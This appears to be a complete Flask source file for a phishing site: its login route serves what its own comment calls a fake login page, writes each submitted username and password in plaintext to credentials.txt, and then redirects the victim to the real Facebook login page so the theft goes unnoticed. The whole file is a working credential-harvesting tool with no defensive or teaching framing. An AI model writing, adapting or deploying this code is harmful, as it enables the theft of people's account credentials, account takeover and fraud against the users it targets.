from flask import Flask, request, redirect, render_template

app = Flask(__name__)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Capture the entered credentials
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Store the credentials in a file or database
        with open('credentials.txt', 'a') as file:
            file.write(f'Username: {username}, Password: {password}\n')
        
        # Redirect the user to the Facebook login page
        return redirect('https://www.facebook.com/login')
    
    # Render the fake login page
    return render_template('login.html')

if __name__ == '__main__':
    app.run()